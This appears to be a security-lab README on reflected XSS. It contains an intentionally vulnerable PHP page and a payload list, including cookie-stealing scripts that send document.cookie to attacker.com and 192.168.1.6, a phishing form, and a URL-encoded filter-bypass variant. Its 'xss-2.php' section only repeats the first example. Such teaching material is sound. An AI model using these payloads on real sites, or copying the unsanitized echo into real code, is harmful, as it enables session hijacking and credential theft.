

# XSS-Vulnerable-Code-Analysis

## Cross-Site Scripting(XSS) Code Analysis and XSS Issue

---

### **Vulnerable Example: xss-1.php**

- vim xss-1.php

      <?php
       session_start();
         setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
         $_SESSION['admin'] = 'admin';
          ?>
                                        
         <!DOCTYPE html>
         <html lang="en">
         <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>XSS Vulnerability Lab</title>
        </head>
        <body>
                                        
         <h1>Welcome To Armour Infosec</h1>

            <?php
          // Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
          if (isset($_REQUEST['user'])) {
             echo $_REQUEST['user'] . "!!";
          }
          ?>
                                        
         <p>Try injecting JavaScript or HTML code into the 'user' parameter in the URL to test reflected XSS:</p>
          <pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
                                        
          </body>
         </html>

  The vulnerable code is using $_REQUEST, which combines GET, POST, and COOKIE variables, expanding the attack surface.

### Risks for Users

- Script Execution: Any visitor who clicks a crafted link or submits a manipulated form could have arbitrary JavaScript executed in their browser in the context of the vulnerable site.

- Cookie Theft: Attackers could use scripts to steal session cookies, hijack logins, or impersonate users.

- Session Security: The presence of admin cookies and session variables further increases attack value—they could be targeted for theft or manipulation.

### Common XSS Exploits (for Lab Purposes)

- Simple script execution:

      <script>alert('XSS')</script>

- Event handler injection:

      <img src=x onerror=alert('XSS')>

- Malicious payloads targeting cookies:

      <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

- HTML injection for phishing:

      <form action="https://malicious-site.com">Enter Password: <input type=password></form>

### Why Leave It Vulnerable?

For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks. It provides hands-on experience for attacking and later learning to defend real web applications.

Note:

Never deploy this or similar code in any environment that is accessible outside a controlled, ethical testing lab.

## Common XSS Exploits (for Lab Purposes)

### 1. Basic Alert Payloads

          <script>alert(123);</script>
          <script>alert("Armour");</script>
          <script>alert(document.domain);</script>
          <script>alert(document.cookie);</script>

- These are simple JavaScript alert popups enclosed in <script> tags.

- They are commonly used to test if XSS vulnerabilities exist by triggering a popup box.

Details:


- alert(123); — Displays a numeric popup alert.

- alert("Armour"); — Displays a popup with the text "Armour".

- alert(document.domain); — Shows the domain of the current document (used to confirm the site context).

- alert(document.cookie); — Displays the user's cookies stored for the site, indicating successful access to sensitive info.

### 2. Cookie Theft via Image Request

    <script>var i=new Image; i.src="http://192.168.1.6/?"+document.cookie;</script>


### 3. URL-Encoded Versions of the Above Payloads

%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D%22http%3A%2F%2F192.168.1.6%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E


- These are the URL-encoded versions of the image-based cookie theft payload.

- URL encoding is used to safely transmit special characters in URLs without breaking web requests or filters.

- When decoded, they become the same JavaScript payload as before.

- Attackers use URL-encoding to bypass input filters or WAFs that don't decode inputs before inspection.


## Summary

| Payload Type                                                | Purpose                                 | Explanation                                            |
|-------------------------------------------------------------|-----------------------------------------|--------------------------------------------------------|
| `<script>alert(...);</script>`                              | Proof of XSS vulnerability              | Shows popup alert to confirm vulnerability             |
| `<script>alert(document.cookie);</script>`                  | Test access to victim’s cookies         | Indicates potential for cookie theft                   |
| `<script>var i=new Image; i.src="..."+document.cookie;</script>` | Steal cookies via HTTP request          | Sends victim’s cookie to attacker's server             |
| `%3Cscript%3E...%3C%2Fscript%3E`                            | Encoded payload for bypassing input restrictions | Encodes special characters for evading filters |

---

### Importance for Security Testing and Labs

- These payloads are typical first steps in security assessments and penetration testing to confirm an XSS flaw.
- The cookie theft payload is a real-world attack vector that hackers use to hijack sessions.
- URL-encoded variants highlight the importance of comprehensive input decoding and normalization before filtering.

> **Always use such payloads responsibly within authorized testing environments or labs, never on unauthorized systems.**

---

### Why Leave It Vulnerable?

- For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks.
- It provides hands-on experience for attacking and later learning to defend real web applications.

> **Note:** Never deploy this or similar code in any environment that is accessible outside a controlled, ethical testing lab.

---



## **Vulnerable Example:** `xss-2.php`

      
      XSS-Vulnerable-Code-Analysis
      
      Cross-Site Scripting(XSS) Code Analysis and XSS Issue
      
      Vulnerable Example: xss-1.php
      
      vim xss-1.php
      
      <?php
      session_start();
      setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
      $_SESSION['admin'] = 'admin';
      ?>
      <!DOCTYPE html>
      <html lang="en">
      <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>XSS Vulnerability Lab</title>
      </head>
      <body>
      <h1>Welcome To Armour Infosec</h1>
      <?php
      // Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
      if (isset($_REQUEST['user']))
          echo $_REQUEST['user'] . "!";
      ?>
      <p>Try injecting JavaScript or HTML code into the 'user' parameter in the URL to test reflected XSS:</p>
      <pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
      </body>
      </html>
